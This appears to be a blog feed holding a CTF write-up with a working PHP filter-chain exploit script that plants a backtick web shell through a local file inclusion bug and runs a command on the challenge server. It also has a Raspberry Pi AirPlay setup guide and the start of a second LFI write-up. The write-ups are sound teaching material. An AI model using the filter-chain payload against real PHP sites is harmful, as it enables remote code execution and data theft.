+	<span class="nf">createHeaders</span><span class="p">(</span><span class="k">array</span><span class="p">(</span><span class="s1">'change_profile'</span> <span class="o">=&gt;</span> <span class="s1">'Edit'</span><span class="p">,</span> <span class="s1">'view_profile'</span> <span class="o">=&gt;</span> <span class="s1">'View'</span><span class="p">),</span> <span class="nv">$safe_handler</span><span class="p">);</span>
+	<span class="cp">?&gt;</span>
+			<span class="nt">&lt;/ul&gt;</span>
+		<span class="nt">&lt;/div&gt;</span>
+	<span class="nt">&lt;/div&gt;</span>
+	<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"blank_space"</span><span class="nt">&gt;&lt;/div&gt;</span>
+
+	<span class="cp">&lt;?php</span>
+	<span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'pHash'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'pHash'</span><span class="p">]))</span>
+	<span class="p">{</span>
+		<span class="nv">$page</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'page'</span><span class="p">];</span>
+		<span class="nv">$hash</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'pHash'</span><span class="p">];</span>
+		<span class="k">if</span><span class="p">(</span><span class="nv">$safe_handler</span><span class="o">-&gt;</span><span class="nf">handle</span><span class="p">(</span><span class="nv">$page</span><span class="p">,</span> <span class="nv">$hash</span><span class="p">))</span>
+		<span class="p">{</span>
+			<span class="k">include</span><span class="p">(</span><span class="nb">base64_decode</span><span class="p">(</span><span class="nv">$page</span><span class="p">)</span> <span class="mf">.</span> <span class="s1">'.php'</span><span class="p">);</span>
+		<span class="p">}</span>
+		<span class="k">else</span>
+		<span class="p">{</span>
+			<span class="k">echo</span> <span class="s2">"&lt;h2&gt;Integrity verification failed...&lt;/h2&gt;"</span><span class="p">;</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+	<span class="k">else</span><span class="p">{</span>
+	<span class="cp">?&gt;</span>
+	<span class="nt">&lt;h1&gt;</span>Welcome to the profile editor !<span class="nt">&lt;/h1&gt;</span>
+	<span class="nt">&lt;p&gt;</span>Here you can create and edit your profile.<span class="nt">&lt;br&gt;</span> A card will be created for your Thcon22 participation.<span class="nt">&lt;br&gt;</span> We hope you will like the rendering !<span class="nt">&lt;/p&gt;</span>
+	<span class="cp">&lt;?php</span>
+	<span class="p">}</span>
+	<span class="cp">?&gt;</span>
+<span class="nt">&lt;/body&gt;</span>
+<span class="nt">&lt;/html&gt;</span>
+</code></pre></div></div>
+
+<p>Now we know for certain how files are loaded - <code class="language-plaintext highlighter-rouge">include(base64_decode($page) . '.php')</code>. We need to find a way to load <code class="language-plaintext highlighter-rouge">/flag.txt</code> even though <code class="language-plaintext highlighter-rouge">.php</code> is always appended.</p>
+
+<h2 id="getting-the-flag">Getting the Flag</h2>
+
+<p>When I participated in hxp CTF 2021 we faced <a href="https://lewin.co.il/winning-the-impossible-race-an-unintended-solution-for-includers-revenge-counter-hxp-2021/">a similar problem</a>, and I remember <a href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d"><code class="language-plaintext highlighter-rouge">loknop</code> developed a creative solution</a> using only <a href="https://www.php.net/manual/en/filters.convert.php">PHP conversion filters</a> passed to <code class="language-plaintext highlighter-rouge">include()</code> to achieve <strong>RCE</strong> (which is much more than what we need here - reading file content, but will work!). I wrote the below solution to adapt the method to this challenge:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">base64</span>
+<span class="kn">import</span> <span class="n">hashlib</span>
+<span class="kn">import</span> <span class="n">requests</span>
+
+<span class="c1"># Based on https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d (until line 52):
+</span><span class="n">conversions</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="sh">'</span><span class="s">R</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2</span><span class="sh">'</span><span class="p">,</span>
+    <span class="sh">'</span><span class="s">B</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2</span><span class="sh">'</span><span class="p">,</span>
+    <span class="sh">'</span><span class="s">C</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">convert.iconv.UTF8.CSISO2022KR</span><span class="sh">'</span><span class="p">,</span>
+    <span class="sh">'</span><span class="s">8</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2</span><span class="sh">'</span><span class="p">,</span>
+    <span class="sh">'</span><span class="s">9</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB</span><span class="sh">'</span><span class="p">,</span>
+    <span class="sh">'</span><span class="s">f</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213</span><span class="sh">'</span><span class="p">,</span>
+    <span class="sh">'</span><span class="s">s</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61</span><span class="sh">'</span><span class="p">,</span>
+    <span class="sh">'</span><span class="s">z</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS</span><span class="sh">'</span><span class="p">,</span>
+    <span class="sh">'</span><span class="s">U</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932</span><span class="sh">'</span><span class="p">,</span>
+    <span class="sh">'</span><span class="s">P</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213</span><span class="sh">'</span><span class="p">,</span>
+    <span class="sh">'</span><span class="s">V</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5</span><span class="sh">'</span><span class="p">,</span>
+    <span class="sh">'</span><span class="s">0</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2</span><span class="sh">'</span><span class="p">,</span>
+    <span class="sh">'</span><span class="s">Y</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2</span><span class="sh">'</span><span class="p">,</span>
+    <span class="sh">'</span><span class="s">W</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2</span><span class="sh">'</span><span class="p">,</span>
+    <span class="sh">'</span><span class="s">d</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2</span><span class="sh">'</span><span class="p">,</span>
+    <span class="sh">'</span><span class="s">D</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2</span><span class="sh">'</span><span class="p">,</span>
+    <span class="sh">'</span><span class="s">7</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2</span><span class="sh">'</span><span class="p">,</span>
+    <span class="sh">'</span><span class="s">4</span><span class="sh">'</span><span class="p">:</span> <span class="sh">'</span><span class="s">convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2</span><span class="sh">'</span>
+<span class="p">}</span>
+
+<span class="c1"># Simple but does the trick
+</span><span class="n">command</span> <span class="o">=</span> <span class="sh">"</span><span class="s">cat /flag.txt</span><span class="sh">"</span>
+
+<span class="c1">#&lt;?=`$_GET[0]`;;?&gt;
+</span><span class="n">base64_payload</span> <span class="o">=</span> <span class="sh">"</span><span class="s">PD89YCRfR0VUWzBdYDs7Pz4</span><span class="sh">"</span>
+
+<span class="c1"># generate some garbage base64
+</span><span class="n">filters</span> <span class="o">=</span> <span class="sh">"</span><span class="s">convert.iconv.UTF8.CSISO2022KR|</span><span class="sh">"</span>
+<span class="n">filters</span> <span class="o">+=</span> <span class="sh">"</span><span class="s">convert.base64-encode|</span><span class="sh">"</span>
+<span class="c1"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file
+</span><span class="n">filters</span> <span class="o">+=</span> <span class="sh">"</span><span class="s">convert.iconv.UTF8.UTF7|</span><span class="sh">"</span>
+
+<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">base64_payload</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span>
+        <span class="n">filters</span> <span class="o">+=</span> <span class="n">conversions</span><span class="p">[</span><span class="n">c</span><span class="p">]</span> <span class="o">+</span> <span class="sh">"</span><span class="s">|</span><span class="sh">"</span>
+        <span class="c1"># decode and reencode to get rid of everything that isn't valid base64
+</span>        <span class="n">filters</span> <span class="o">+=</span> <span class="sh">"</span><span class="s">convert.base64-decode|</span><span class="sh">"</span>
+        <span class="n">filters</span> <span class="o">+=</span> <span class="sh">"</span><span class="s">convert.base64-encode|</span><span class="sh">"</span>
+        <span class="c1"># get rid of equal signs
+</span>        <span class="n">filters</span> <span class="o">+=</span> <span class="sh">"</span><span class="s">convert.iconv.UTF8.UTF7|</span><span class="sh">"</span>
+
+<span class="n">filters</span> <span class="o">+=</span> <span class="sh">"</span><span class="s">convert.base64-decode</span><span class="sh">"</span>
+<span class="n">file_to_use</span> <span class="o">=</span> <span class="sh">"</span><span class="s">index</span><span class="sh">"</span>
+
+<span class="n">final_payload</span> <span class="o">=</span> <span class="sa">f</span><span class="sh">"</span><span class="s">php://filter/</span><span class="si">{</span><span class="n">filters</span><span class="si">}</span><span class="s">/resource=</span><span class="si">{</span><span class="n">file_to_use</span><span class="si">}</span><span class="sh">"</span><span class="p">.</span><span class="nf">encode</span><span class="p">()</span>
+
+<span class="c1"># "Local Card Maker"-specific implementation starts here:
+</span>
+<span class="n">key_salt</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">"</span><span class="s">Thcon_SuP3r_S3cr4t_K3y!</span><span class="sh">"</span>
+<span class="n">buf</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">encodebytes</span><span class="p">(</span><span class="n">final_payload</span><span class="p">).</span><span class="nf">replace</span><span class="p">(</span><span class="sa">b</span><span class="sh">"</span><span class="se">\n</span><span class="sh">"</span><span class="p">,</span> <span class="sa">b</span><span class="sh">""</span><span class="p">)</span>
+<span class="n">buf_hash</span> <span class="o">=</span> <span class="p">(</span><span class="n">hashlib</span><span class="p">.</span><span class="nf">sha1</span><span class="p">(</span><span class="n">key_salt</span> <span class="o">+</span> <span class="n">buf</span><span class="p">).</span><span class="nf">hexdigest</span><span class="p">())</span>
+<span class="n">buf</span> <span class="o">=</span> <span class="n">buf</span><span class="p">.</span><span class="nf">decode</span><span class="p">()</span>
+
+<span class="nf">print</span><span class="p">(</span><span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">"</span><span class="s">http://challenges1.thcon.party:2001/index.php?page=%s&amp;pHash=%s&amp;0=%s</span><span class="sh">"</span> <span class="o">%</span> <span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">buf_hash</span><span class="p">,</span> <span class="n">command</span><span class="p">)).</span><span class="n">content</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>The result contained the flag <code class="language-plaintext highlighter-rouge">Thcon22{_Php_&amp;nd_Ap@che_R000ck5$$_}</code> - I guess the original solution should have used Apache? 😅</p>]]></content><author><name>Guy Lewin</name></author><category term="ctf" /><category term="exploit" /><category term="lfi" /><category term="php" /><category term="rce" /><category term="sha-1" /><category term="web" /><summary type="html"><![CDATA[I participated in THCon 2k22 CTF and amongst the incredible “web” challenges - my favorite was “Local Card Maker” (made by jrjgjk). In this post I’ll describe the challenge and my step-by-step solution.]]></summary></entry><entry><title type="html">Bathroom Smart Speaker Part 2 – AirPlay to Bluetooth Speaker via Raspberry Pi</title><link href="https://lewin.co.il/2022/03/02/bathroom-smart-speaker-part-2-airplay-to-bluetooth-speaker-via-raspberry-pi.html" rel="alternate" type="text/html" title="Bathroom Smart Speaker Part 2 – AirPlay to Bluetooth Speaker via Raspberry Pi" /><published>2022-03-02T03:22:11+00:00</published><updated>2022-03-02T03:22:11+00:00</updated><id>https://lewin.co.il/2022/03/02/bathroom-smart-speaker-part-2-airplay-to-bluetooth-speaker-via-raspberry-pi</id><content type="html" xml:base="https://lewin.co.il/2022/03/02/bathroom-smart-speaker-part-2-airplay-to-bluetooth-speaker-via-raspberry-pi.html"><![CDATA[<p>In <a href="https://lewin.co.il/bathroom-smart-speaker-using-ue-boom-raspberry-pi-spotify-and-home-assistant/">part 1</a> I wrote on how to create a smart speaker supporting Spotify Connect using a Raspberry Pi and a Bluetooth speaker. Since writing that post I started using Apple Music and wanted to enjoy simultaneous streaming of music to multiple speakers in my house. I wanted my bathroom speaker, which became smart by supporting Spotify Connect, to also be able to play Apple Music.</p>
+
+<p>Apple Music casting uses <a href="https://www.apple.com/airplay/">AirPlay</a> for casting audio between devices. It can be used to cast any sound from Apple devices, even when using Spotify, watching YouTube or having a phone call.</p>
+
+<p>In order to add this capability to your smart speaker from the previous post - we’re going to use <a href="https://github.com/mikebrady/shairport-sync">shairport-sync</a>, which is an open-source audio player supporting AirPlay 1 (and AirPlay 2 partially, at the time of writing this post). The instructions in this post are partially based on <a href="https://github.com/mikebrady/shairport-sync/issues/200#issuecomment-520574102">this GitHub comment by <code class="language-plaintext highlighter-rouge">bedrin</code></a>.</p>
+
+<h2 id="steps">Steps</h2>
+
+<h3 id="installing-shairport-sync">Installing shairport-sync</h3>
+
+<p>Execute the following commands from to install the most recent version of shairport-sync:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>apt-get update
+<span class="nb">sudo </span>apt-get <span class="nb">install </span>build-essential git xmltoman autoconf automake libtool libpopt-dev libconfig-dev libasound2-dev avahi-daemon libavahi-client-dev libssl-dev libsoxr-dev
+git clone https://github.com/mikebrady/shairport-sync.git
+<span class="nb">cd </span>shairport-sync
+autoreconf <span class="nt">-fi</span>
+./configure <span class="nt">--sysconfdir</span><span class="o">=</span>/etc <span class="nt">--with-alsa</span> <span class="nt">--with-soxr</span> <span class="nt">--with-avahi</span> <span class="nt">--with-ssl</span><span class="o">=</span>openssl <span class="nt">--with-systemd</span>
+make
+<span class="nb">sudo </span>make <span class="nb">install</span>
+</code></pre></div></div>
+
+<h3 id="giving-shairport-sync-bluetooth-permissions">Giving shairport-sync Bluetooth Permissions</h3>
+
+<p>shairport-sync needs permissions to play sound over Bluetooth. Run these commands to add shairport-sync’s user (and <code class="language-plaintext highlighter-rouge">pi</code> for testing purposes) to the Bluetooth UNIX group which will permit it to play audio:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>adduser pi bluetooth
+<span class="nb">sudo </span>adduser shairport-sync bluetooth
+</code></pre></div></div>
+
+<h3 id="adding-additional-alsa-device">Adding Additional ALSA Device</h3>
+
+<p>In the previous post we edited <code class="language-plaintext highlighter-rouge">/etc/asound.conf</code> to point to the Bluetooth speaker as the default device. shairport-sync requires a named device, so we’ll create another ALSA device alongside the default one to also map to the Bluetooth speaker.</p>
+
+<p>Open <code class="language-plaintext highlighter-rouge">/etc/asound.conf</code> and copy the MAC address you filled after <code class="language-plaintext highlighter-rouge">defaults.bluealsa.device</code> (should be at line 4 in quotation marks). Replace the content of <code class="language-plaintext highlighter-rouge">/etc/asound.conf</code> with the following, while replacing <code class="language-plaintext highlighter-rouge">&lt;UE Boom Bluetooth MAC&gt;</code> with the MAC address you found in line 4:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>pcm.!default "bluealsa"
+ctl.!default "bluealsa"
+defaults.bluealsa.interface "hci0"
+defaults.bluealsa.device "&lt;UE Boom Bluetooth MAC&gt;"
+defaults.bluealsa.profile "a2dp"
+
+pcm.bathroom_bt {
+ type plug
+  slave {
+    pcm {
+      type bluealsa
+      device "&lt;UE Boom Bluetooth MAC&gt;"
+      profile "a2dp"
+    }
+  }
+  hint {
+    show on
+    description "Bathroom BT"
+  }
+}
+</code></pre></div></div>
+
+<p>In the above configuration I named this device “bathroom_bt” (line 7) with the description “Bathroom BT”. You can replace this to fit your scenario, but make sure to replace it in the below shairport-sync configuration as well.</p>
+
+<h3 id="shairport-sync-configuration">shairport-sync Configuration</h3>
+
+<p>Now that the ALSA device is configured - we should configure shairport-sync to use this device as the sound output device. Replace the content of <code class="language-plaintext highlighter-rouge">/etc/shairport-sync.conf</code> with the following:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>general =
+{
+	name = "Bathroom Speaker";
+};
+
+sessioncontrol =
+{
+	allow_session_interruption = "yes";
+};
+
+alsa =
+{
+	output_device = "bathroom_bt";
+};
+</code></pre></div></div>
+
+<p>The <code class="language-plaintext highlighter-rouge">name</code> parameter under <code class="language-plaintext highlighter-rouge">general</code> (line 3) will be the displayed AirPlay name, set it to a suitable value. If you changed the name of the ALSA device (in <code class="language-plaintext highlighter-rouge">/etc/asound.conf</code> at line 7) change it under <code class="language-plaintext highlighter-rouge">output_device</code> at line 13 as well.</p>
+
+<h3 id="disable-wifi-power-management">Disable WiFi Power Management</h3>
+
+<p>Raspberry Pi’s WiFi can sometimes goes into power-saving mode, which can cause audio drops and glitches when acting as an AirPlay server. We can disable the WiFi power management by editing <code class="language-plaintext highlighter-rouge">/etc/rc.local</code> and adding the following line right before <code class="language-plaintext highlighter-rouge">exit 0</code> (if you followed my previous post - this should be at line 19):</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>iwconfig wlan0 power off
+</code></pre></div></div>
+
+<p>After adding this line, your <code class="language-plaintext highlighter-rouge">/etc/rc.local</code> should look like this:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/sh -e</span>
+<span class="c">#</span>
+<span class="c"># rc.local</span>
+<span class="c">#</span>
+<span class="c"># This script is executed at the end of each multiuser runlevel.</span>
+<span class="c"># Make sure that the script will "exit 0" on success or any other</span>
+<span class="c"># value on error.</span>
+<span class="c">#</span>
+<span class="c"># In order to enable or disable this script just change the execution</span>
+<span class="c"># bits.</span>
+<span class="c">#</span>
+<span class="c"># By default this script does nothing.</span>
+
+<span class="c"># Print the IP address</span>
+<span class="nv">_IP</span><span class="o">=</span><span class="si">$(</span><span class="nb">hostname</span> <span class="nt">-I</span><span class="si">)</span> <span class="o">||</span> <span class="nb">true
+</span><span class="k">if</span> <span class="o">[</span> <span class="s2">"</span><span class="nv">$_IP</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then
+  </span><span class="nb">printf</span> <span class="s2">"My IP address is %s</span><span class="se">\n</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$_IP</span><span class="s2">"</span>
+<span class="k">fi
+
+</span>iwconfig wlan0 power off
+
+<span class="nb">exit </span>0
+</code></pre></div></div>
+
+<h3 id="enable-shairport-sync-service">Enable shairport-sync Service</h3>
+
+<p>Finalize your setup by enabling the <code class="language-plaintext highlighter-rouge">shairport-sync</code> service and performing a system reboot to load all the new configurations:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>systemctl <span class="nb">enable </span>shairport-sync
+<span class="nb">sudo </span>reboot
+</code></pre></div></div>]]></content><author><name>Guy Lewin</name></author><category term="airplay" /><category term="apple music" /><category term="bluetooth" /><category term="home assistant" /><category term="raspberry pi" /><category term="shairport-sync" /><category term="spotify" /><category term="ue boom" /><summary type="html"><![CDATA[In part 1 I wrote on how to create a smart speaker supporting Spotify Connect using a Raspberry Pi and a Bluetooth speaker. Since writing that post I started using Apple Music and wanted to enjoy simultaneous streaming of music to multiple speakers in my house. I wanted my bathroom speaker, which became smart by supporting Spotify Connect, to also be able to play Apple Music.]]></summary></entry><entry><title type="html">Winning the Impossible Race – An Unintended Solution for Includer’s Revenge / Counter (hxp 2021)</title><link href="https://lewin.co.il/2021/12/27/winning-the-impossible-race-an-unintended-solution-for-includers-revenge-counter-hxp-2021.html" rel="alternate" type="text/html" title="Winning the Impossible Race – An Unintended Solution for Includer’s Revenge / Counter (hxp 2021)" /><published>2021-12-27T21:32:49+00:00</published><updated>2021-12-27T21:32:49+00:00</updated><id>https://lewin.co.il/2021/12/27/winning-the-impossible-race-an-unintended-solution-for-includers-revenge-counter-hxp-2021</id><content type="html" xml:base="https://lewin.co.il/2021/12/27/winning-the-impossible-race-an-unintended-solution-for-includers-revenge-counter-hxp-2021.html"><![CDATA[<p>In December 2021 Eyal Daniel and me (Guy Lewin) participated in <a href="https://2021.ctf.link/">hxp CTF 2021</a> on behalf of “<a href="https://ctftime.org/team/6965">pasten</a>” group. We found an LFI exploit relying solely on PHP including a file running alongside Nginx.</p>
+
+<h2 id="the-challenges">The Challenges</h2>
+
+<p>The recent hxp CTF brought us some great challenges, 2 of those challenges were <code class="language-plaintext highlighter-rouge">includer's revenge</code> and <code class="language-plaintext highlighter-rouge">counter</code> - hard and medium web-challenges respectively.</p>
+
+<p>While trying to solve <code class="language-plaintext highlighter-rouge">includer's revenge</code> we managed to find an awesome and incredibly hard to exploit solution that was also working on the second challenge (<code class="language-plaintext highlighter-rouge">counter</code>). Both of these challenges are based on the <code class="language-plaintext highlighter-rouge">LFI (Local File Inclusion)</code> concept, like familiar challenges from previous years. <code class="language-plaintext highlighter-rouge">LFI</code> is a highly documented and known category of vulnerabilities and this year’s challenges are making it a bit harder to exploit than usual.</p>
+
+<h2 id="includers-revenge">includer’s revenge</h2>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> <span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'action'</span><span class="p">]</span> <span class="o">??</span> <span class="s1">'read'</span> <span class="p">)</span> <span class="o">===</span> <span class="s1">'read'</span> <span class="o">?</span> <span class="nb">readfile</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">]</span> <span class="o">??</span> <span class="s1">'index.php'</span><span class="p">)</span> <span class="o">:</span> <span class="k">include_once</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">]</span> <span class="o">??</span> <span class="s1">'index.php'</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>A very basic PHP endpoint that either reads a file, or includes it. The typical challenge is creating a local file on the server that contains a malicious PHP code. There are many documented methods to do this, the most naive one is simply using an existing upload mechanism in the targeted website. Given the simplicity of this challenge (the above code is the entire logic behind the target server) - we need a different kind of approach.</p>
+
+<h2 id="environment-caches-sessions-and-what-not">Environment, Caches, Sessions and What Not</h2>
+
+<p>This kind of approach takes advantage of dynamically generated files that are created in various ways using different features and situations in the underlying framework and environment. For example - inserting a log record to a running application’s log file might actually make the log file a valid PHP page! Imagine browsing to <code class="language-plaintext highlighter-rouge">/&lt;?php ... ?&gt;</code>, suddenly - the Nginx log file can be included and trigger logic controlled by the attacker.</p>
+
+<h2 id="the-hardened-setup">The Hardened Setup</h2>
+
+<p>On top of the source code - we are also given the <code class="language-plaintext highlighter-rouge">Dockerfile</code> for creating a local instance of the challenge. Below is the <code class="language-plaintext highlighter-rouge">Dockerfile</code> used in <code class="language-plaintext highlighter-rouge">includer's revenge</code>, the difference between it and <code class="language-plaintext highlighter-rouge">counter</code>‘s is irrelevant for our exploit.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>RUN <span class="nb">chown</span> <span class="nt">-R</span> root:root /var/www <span class="o">&amp;&amp;</span> <span class="se">\</span>
+    find /var/www <span class="nt">-type</span> d <span class="nt">-exec</span> <span class="nb">chmod </span>555 <span class="o">{}</span> <span class="se">\;</span> <span class="o">&amp;&amp;</span> <span class="se">\</span>
+    find /var/www <span class="nt">-type</span> f <span class="nt">-exec</span> <span class="nb">chmod </span>444 <span class="o">{}</span> <span class="se">\;</span> <span class="o">&amp;&amp;</span> <span class="se">\</span>
+    <span class="nb">chown</span> <span class="nt">-R</span> root:root /tmp /var/tmp /var/lib/php/sessions <span class="o">&amp;&amp;</span> <span class="se">\</span>
+    <span class="nb">chmod</span> <span class="nt">-R</span> 000 /tmp /var/tmp /var/lib/php/sessions
+
+RUN <span class="nb">ln</span> <span class="nt">-sf</span> /dev/stdout /var/log/nginx/access.log <span class="o">&amp;&amp;</span> <span class="se">\</span>
+    <span class="nb">ln</span> <span class="nt">-sf</span> /dev/stderr /var/log/nginx/error.log
+
+RUN find / <span class="nt">-ignore_readdir_race</span> <span class="nt">-type</span> f <span class="se">\(</span> <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-o</span> <span class="nt">-perm</span> <span class="nt">-2000</span> <span class="se">\)</span> <span class="nt">-not</span> <span class="nt">-wholename</span> /readflag <span class="nt">-delete</span>
+</code></pre></div></div>
+
+<p>We notice several things when looking at the file. PHP doesn’t have permissions to write into its sessions directory, which prevents us from setting a PHP session with malicious code into a session file. In addition, when PHP creates temporary files (for buffering, or <code class="language-plaintext highlighter-rouge">php://temp</code> for example) it runs the <code class="language-plaintext highlighter-rouge">php_get_temporary_directory()</code> function to resolve the temp directory. Sadly, in this setup the result is always <code class="language-plaintext highlighter-rouge">/tmp</code>. Since PHP can’t write into it (see <code class="language-plaintext highlighter-rouge">Dockerfile</code> above) - we didn’t go in this direction.</p>
+
+<p>On top of that - Nginx’s log files are redirected to <code class="language-plaintext highlighter-rouge">stdout</code> and <code class="language-plaintext highlighter-rouge">stderr</code> which means that there are no logs on the filesystem (i.e. we can’t use Nginx access / errors to write malicious code into a file).</p>
+
+<h2 id="ignoring-the-obvious">Ignoring the Obvious</h2>
+
+<p>When you’re doing enough challenges, you learn to spot the important parts of the challenge - the little clues that are right in front of you, the configuration that should not be there, the misplaced <code class="language-plaintext highlighter-rouge">"</code>, the unusual choice of words in the description.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mf">...</span> <span class="nb">readfile</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">]</span> <span class="o">??</span> <span class="s1">'index.php'</span><span class="p">)</span> <span class="o">:</span> <span class="k">include_once</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">]</span> <span class="mf">...</span>
+</code></pre></div></div>
+
+<p>The challenge consists of two major parts - <code class="language-plaintext highlighter-rouge">readfile()</code> and <code class="language-plaintext highlighter-rouge">include_once()</code>. At first sight, it seems like we were meant to leverage <code class="language-plaintext highlighter-rouge">readfile()</code> for somehow placing a file and <code class="language-plaintext highlighter-rouge">include_once()</code> to execute it. Having said that, completely aware of the path we’re supposed to walk in, we chose to go in a completely different way.</p>
+
+<h2 id="the-pasten-way">The Pasten Way</h2>
+
+<p>There is nothing like solving a challenge in an unintended way! Trying to find different types of dynamic files, we decided to look into Nginx as a target. The first Google result for <code class="language-plaintext highlighter-rouge">"nginx tempfile"</code> was actually a breakthrough, revealing Nginx <strong>does</strong> create temporary files (mainly because people were complaining about permission errors).</p>
+
+<p>When we read more about it, we found the following documentation:</p>
+
